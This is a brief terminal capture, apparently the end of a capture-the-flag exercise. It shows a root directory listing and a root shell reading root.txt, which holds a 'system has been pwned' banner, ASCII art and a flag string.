4.0K drwxr-xr-x  3 root root 4.0K Jun 30  2023 .local
4.0K -rw-r--r--  1 root root  161 Jul  9  2019 .profile
4.0K -rw-r-----  1 root root  478 Jul  7  2023 root.txt
4.0K -rw-r--r--  1 root root   66 Jul  6  2023 .selected_editor
4.0K drwx------  2 root root 4.0K Jul 13  2023 .ssh
bash-5.2# cat root.txt
cat root.txt
CONGRATULATIONS, the system has been pwned!

          _______
        @@@@@@@@@@@
      @@@@@@@@@@@@@@@
     @@@@@@@222@@@@@@@
    (@@@@@/_____\@@@@@)
     @@@@(_______)@@@@
      @@@{ " L " }@@@
       \@  \ - /  @/
        /    ~    \
      / ==        == \
    <      \ __ /      >
   / \          |    /  \
 /    \       ==+==       \
|      \     ___|_         |
| \//~~~|---/ * ~~~~  |     }
{  /|   |-----/~~~~|  |    /
 \_ |  /           |__|_ /


+wP"y8z3TcDqO!&a*rg/
```

